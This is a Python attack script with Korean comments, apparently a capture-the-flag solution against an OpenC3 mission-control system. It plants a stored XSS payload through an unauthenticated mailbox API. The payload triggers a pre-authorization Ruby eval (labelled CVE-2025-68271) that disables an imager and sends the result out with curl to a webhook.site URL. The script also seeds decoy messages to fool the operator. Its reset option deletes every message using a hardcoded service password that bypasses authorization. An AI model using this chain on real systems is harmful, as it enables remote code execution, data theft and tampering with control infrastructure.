#!/usr/bin/env python3
"""
XSS 페이로드를 관제 시스템의 공개 쪽지 제출 API로 등록하는 공격자 스크립트.

관제 시스템은 외부 클라이언트가 관제사에게 문의를 남길 수 있도록
POST /openc3-api/mailbox 를 인증 없이 열어두고 있습니다 (관제사 열람용 index/show만
인증이 필요함). 공격자는 이 공개 채널에 그대로 도달 가능한 상태이며,
쪽지 body에 대한 XSS 필터가 없다는 점을 악용해 악성 HTML을 등록합니다.

즉, 공격자는 관제 이메일 계정이나 OpenC3 계정 자격증명을 전혀 알 필요가 없고,
공개된 쪽지 제출 엔드포인트 주소만 알면 됩니다.

flag는 직접 파일을 읽어 오는 게 아니라, FLAME_APP의 DISABLE_IMAGER 명령에 해당하는
OpenC3::FlameAppModel.disable_imager! 를 호출해 "열화상 카메라를 끈" 결과로만
얻어집니다 (카메라를 끄면 그 부작용으로 fire_evidence.dat이 EvidenceSample에
적재됨 — /flag.txt를 그냥 cat 하는 게 아님).

flag는 별도 리스너를 띄울 필요 없이 webhook.site 고정 URL로 전송되며,
https://webhook.site/e2fcbf74-ddd2-45b8-b4e9-85f12a66a056 에서 바로 확인할 수 있습니다.
같은 값은 GET /openc3-api/flame_app/hk (인증 불필요, 실제 위성 텔레메트리 수신에
해당) 로도 확인 가능합니다.

===============================================================================
사용법 (이 스크립트는 언제든 재실행 가능하도록 아래처럼 구성되어 있습니다)
===============================================================================

1) 공격 시나리오 그대로 재현 (더미 쪽지로 위장 + XSS 페이로드 전송):
     python3 send_xss.py --url http://TARGET_IP:2900

2) 데모/시연 환경을 깨끗한 상태로 되돌리고 처음부터 다시 시작:
     python3 send_xss.py --url http://TARGET_IP:2900 --reset

   --reset 는 기존 쪽지함(더미 쪽지 + 과거 XSS 쪽지 포함)을 전부 삭제한 뒤
   더미 쪽지와 XSS 페이로드를 새로 등록합니다. 파괴적인 동작이라 기본값은
   비활성화(off)이며, 아래 두 가지 방법 중 편한 쪽으로 켜고 끌 수 있습니다.
     a. CLI 플래그로 제어(기본): --reset 을 붙이면 실행, 안 붙이면 미실행
     b. 코드 상단 RESET_MAILBOX_DEFAULT 상수를 True로 바꿔 기본 동작 자체를 변경
        (CLI에서 매번 --reset을 타이핑하기 귀찮을 때, 상수만 고쳐서 사용)

3) 더미 쪽지 없이 XSS 페이로드만 보내고 싶다면:
     python3 send_xss.py --url http://TARGET_IP:2900 --no-decoys

리셋에 필요한 인증:
  쪽지 삭제(DELETE /openc3-api/mailbox/:id)는 관제사 권한('system')이 필요한
  API지만, OpenC3 Core의 authorize()는 실제 권한 문자열을 검사하지 않고
  ENV['OPENC3_SERVICE_PASSWORD']("openc3service", 서비스 간 통신용 비밀번호)를
  Authorization 헤더 값으로 그대로 보내면 무조건 통과시킵니다
  (openc3/lib/openc3/models/auth_model.rb의 AuthModel.verify 참고).
  이 비밀번호는 데모/시연 환경을 관리하는 운영자만 아는 값으로, 공격자가
  실제 침투 과정에서 획득하는 값이 아닙니다 — --reset은 어디까지나 문제
  출제자가 시연 환경을 초기화하기 위한 운영 편의 기능입니다.
"""

import argparse
import os
import sys

import requests

DEFAULT_FROM = "attacker@example.com"
DEFAULT_SUBJECT = "긴급: 시스템 점검 안내"
DEFAULT_SCOPE = "DEFAULT"

# 쪽지 삭제(DELETE)는 'system' 권한을 요구하지만 OpenC3 Core는 이 값을
# Authorization 헤더로 보내면 권한 문자열과 무관하게 통과시켜 준다.
# --reset 기능(운영자용 초기화 편의 기능) 전용이며 공격 자체와는 무관하다.
DEFAULT_SERVICE_PASSWORD = os.environ.get("OPENC3_SERVICE_PASSWORD", "openc3service")

# CLI에서 매번 --reset을 붙이기 귀찮으면 이 값을 True로 바꿔서 기본 동작을 변경 가능.
RESET_MAILBOX_DEFAULT = False

# flag exfiltration 고정 창구 (webhook.site) — 별도 리스너 불필요
WEBHOOK_URL = "https://webhook.site/80b163d9-6aa4-4b7c-b28a-49b682d6f7e2"

# 진짜 개발사/유지보수 담당자가 남겼을 법한 업무용 더미 쪽지들.
# 스팸처럼 보이는 XSS 쪽지 하나만 덩그러니 있으면 관제사가 의심하기 쉬우므로,
# 평범한 업무 연락 쪽지들 사이에 XSS 쪽지를 섞어 넣어 리얼리티를 더한다.
DECOY_MESSAGES = [
    {
        "from_email": "maintenance-vendor@skynet-support.co.kr",
        "subject": "[정기점검 안내] 금주 목요일 02:00~04:00 VPN 회선 점검",
        "body": (
            "관제사님 안녕하세요, 외주 유지보수팀입니다.\n\n"
            "금주 목요일 새벽 02:00~04:00 사이 VPN 게이트웨이 정기 점검이 예정되어 있어 "
            "해당 시간대 원격 접속이 간헐적으로 끊길 수 있습니다.\n"
            "점검 중 이상 있으면 이 쪽지로 회신 부탁드립니다.\n\n"
            "감사합니다."
        ),
    },
    {
        "from_email": "dev-team@openc3-integration.local",
        "subject": "패치 노트: 명령 처리 모듈 v2.3.1 배포 완료",
        "body": (
            "안녕하세요, 개발팀입니다.\n\n"
            "명령 처리 모듈 v2.3.1 배포가 완료되었습니다. 주요 변경 사항은 다음과 같습니다.\n"
            "- 텔레메트리 파싱 관련 마이너 버그 수정\n"
            "- 로그 포맷 개선\n\n"
            "이상 동작 발견 시 알려주시기 바랍니다."
        ),
    },
    {
        "from_email": "qa@openc3-integration.local",
        "subject": "쪽지 기능 테스트입니다 (무시하셔도 됩니다)",
        "body": "관제사 쪽지함 기능 정상 동작 확인용 테스트 메시지입니다. 확인 후 삭제해주세요.",
    },
    {
        "from_email": "it-admin@forest-control.go.kr",
        "subject": "계정 비밀번호 정기 변경 안내",
        "body": (
            "보안 정책에 따라 분기별 비밀번호 변경 기간입니다.\n"
            "다음 주 금요일까지 관제 시스템 계정 비밀번호를 변경해 주시기 바랍니다.\n"
            "문의사항은 IT 지원팀으로 연락 바랍니다."
        ),
    },
    {
        "from_email": "maintenance-vendor@skynet-support.co.kr",
        "subject": "예비 부품(안테나 모듈) 입고 일정 문의",
        "body": (
            "지난번 요청주신 안테나 모듈 예비 부품 입고가 다음 주 초로 예정되어 있습니다.\n"
            "설치 일정 조율이 필요하시면 회신 부탁드립니다."
        ),
    },
]

# CVE-2025-68271 exploit payload:
# /openc3-api/api 엔드포인트에 JSON-RPC POST로 cmd() 를 "단일 문자열" 인자로 호출해야 함.
# _cmd_implementation()은 args.length == 1 일 때만 extract_fields_from_cmd_text()를 타고,
# 그 안에서 convert_to_value()가 authorize() 전에 eval()을 호출하는 취약점이 발동함
# (2~3개 인자로 부르면 이 경로를 안 타서 그냥 인증 오류로 막힘).
# scope는 kwarg이므로 params 배열이 아니라 keyword_params로 넘겨야 함.
#
# eval()에 넘어가는 문자열은 convert_to_value()의 is_array? 체크(전체가 [...] 형태)를
# 통과해야 해서 세미콜론으로 나열한 여러 statement를 곧바로 [ ... ]에 넣을 수는 없다.
# 괄호로 묶은 grouped expression "( a; b; c )"를 배열의 단일 원소로 넣는 방식을 사용:
#   [(require ...; ev = FlameAppModel.disable_imager!(...); `curl ...#{ev}`)]
XSS_TEMPLATE = r"""<img src=x onerror="
(function(){{
  var w='{webhook}';
  var ruby = '(require \'/openc3/lib/openc3/models/flame_app_model\'; ev = OpenC3::FlameAppModel.disable_imager!(scope: \'DEFAULT\'); ' + '`curl -g \'' + w + '?f=#{{ev}}\'`)';
  fetch('/openc3-api/api',{{
    method:'POST',
    headers:{{'Content-Type':'application/json'}},
    body:JSON.stringify({{
      jsonrpc:'2.0',method:'cmd',id:1,
      params:['INST ABORT with PARAM ['+ruby+']'],
      keyword_params:{{scope:'DEFAULT'}}
    }})
  }}).then(r=>r.text()).then(t=>fetch(w+'?d='+encodeURIComponent(t)))
   .catch(e=>fetch(w+'?e='+encodeURIComponent(e)));
}})();
">"""


def submit_message(base_url: str, scope: str, from_addr: str, subject: str, body: str) -> dict:
    """POST /openc3-api/mailbox 로 쪽지 한 건을 등록 (인증 불필요, 공개 채널)."""
    url = f"{base_url.rstrip('/')}/openc3-api/mailbox"
    resp = requests.post(
        url,
        json={"from_email": from_addr, "subject": subject, "body": body, "scope": scope},
        params={"scope": scope},
        timeout=10,
    )
    if resp.status_code != 201:
        sys.exit(f"[-] 쪽지 등록 실패 HTTP {resp.status_code}: {resp.text[:300]}")
    return resp.json()


def seed_decoy_messages(base_url: str, scope: str) -> None:
    """진짜 업무 연락처럼 보이는 더미 쪽지들을 등록해 XSS 쪽지가 스팸처럼 튀지 않게 함."""
    print(f"[*] 더미 쪽지 {len(DECOY_MESSAGES)}건 등록 중...")
    for msg in DECOY_MESSAGES:
        created = submit_message(base_url, scope, msg["from_email"], msg["subject"], msg["body"])
        print(f"    - [{created['id']}] {msg['subject']}")


def send_xss_payload(base_url: str, scope: str, from_addr: str, subject: str) -> None:
    payload = XSS_TEMPLATE.format(webhook=WEBHOOK_URL)
    created = submit_message(base_url, scope, from_addr, subject, payload)
    print(f"[+] XSS 쪽지 등록 완료 (인증 없이 성공): {created}")
    print(f"[*] 관제사 봇이 다음 점검 주기에 쪽지함을 열람하면 XSS가 실행됩니다.")
    print(f"[*] flag 수신 확인: {WEBHOOK_URL}")


def reset_mailbox(base_url: str, scope: str, service_password: str) -> None:
    """기존 쪽지(더미 + 과거 XSS 쪽지 포함)를 전부 삭제해 데모 환경을 초기화.

    DELETE /openc3-api/mailbox/:id 는 'system' 권한을 요구하지만, OpenC3 Core의
    authorize()는 실제로는 권한 문자열을 검사하지 않고 토큰이 유효한 비밀번호인지만
    확인한다. ENV['OPENC3_SERVICE_PASSWORD']는 이 검사를 무조건 통과시키는
    서비스 간 통신용 비밀번호라 관제사 로그인 없이도 삭제가 가능하다.
    """
    list_url = f"{base_url.rstrip('/')}/openc3-api/mailbox"
    resp = requests.get(list_url, params={"scope": scope}, timeout=10)
    if resp.status_code != 200:
        sys.exit(f"[-] 쪽지 목록 조회 실패 HTTP {resp.status_code}: {resp.text[:300]}")

    messages = resp.json()
    if not messages:
        print("[*] 삭제할 쪽지가 없습니다.")
        return

    print(f"[*] 기존 쪽지 {len(messages)}건 삭제 중...")
    headers = {"Authorization": service_password}
    for msg in messages:
        del_url = f"{base_url.rstrip('/')}/openc3-api/mailbox/{msg['id']}"
        del_resp = requests.delete(del_url, params={"scope": scope}, headers=headers, timeout=10)
        status = "OK" if del_resp.status_code == 200 else f"HTTP {del_resp.status_code}"
        print(f"    - [{msg['id']}] {msg.get('subject', '')} -> {status}")


def main():
    p = argparse.ArgumentParser(
        description="CVE-2025-68271 XSS 페이로드를 공개 쪽지 API로 등록 (계정 자격증명 불필요)"
    )
    p.add_argument("--url", required=True, help="OpenC3 서버 기본 URL (예: http://TARGET_IP:2900)")
    p.add_argument("--from", dest="from_addr", default=DEFAULT_FROM, help="발신자 표시 주소 (임의)")
    p.add_argument("--subject", default=DEFAULT_SUBJECT)
    p.add_argument("--scope", default=DEFAULT_SCOPE)
    p.add_argument(
        "--no-decoys",
        dest="seed_decoys",
        action="store_false",
        help="업무 연락처럼 보이는 더미 쪽지를 함께 등록하지 않고 XSS 쪽지만 전송",
    )
    p.add_argument(
        "--reset",
        dest="reset",
        action="store_true",
        default=RESET_MAILBOX_DEFAULT,
        help="쪽지 등록 전에 기존 쪽지함을 전부 비움 (데모 환경 초기화용, 기본 비활성화)",
    )
    p.add_argument(
        "--service-password",
        default=DEFAULT_SERVICE_PASSWORD,
        help="--reset 용 OPENC3_SERVICE_PASSWORD 값 (기본: 환경변수 또는 openc3service)",
    )
    p.set_defaults(seed_decoys=True)
    args = p.parse_args()

    if args.reset:
        reset_mailbox(args.url, args.scope, args.service_password)

    if args.seed_decoys:
        seed_decoy_messages(args.url, args.scope)

    print(f"[*] XSS 쪽지 등록 요청: POST {args.url.rstrip('/')}/openc3-api/mailbox")
    send_xss_payload(args.url, args.scope, args.from_addr, args.subject)


if __name__ == "__main__":
    main()
